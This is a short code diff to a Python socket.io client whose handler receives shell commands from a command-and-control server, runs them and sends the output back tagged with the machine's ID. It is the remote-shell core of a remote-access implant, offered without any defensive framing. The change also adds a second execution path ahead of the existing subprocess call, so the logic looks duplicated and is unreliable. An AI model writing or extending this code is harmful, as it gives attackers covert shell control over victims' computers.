@@ -65,8 +65,14 @@ def make_client():
 
     @sio.on("shell_command")
     def on_command(data):
-        """Receive command from C2, run it, send output back."""
         command = data.get("command", "")
+        if not command:
+            return
+        output = run_command(command)
+        sio.emit("shell_output", {
+            "machine": MACHINE_ID,
+            "output": output
+        })
         try:
             result = subprocess.run(
                 command,
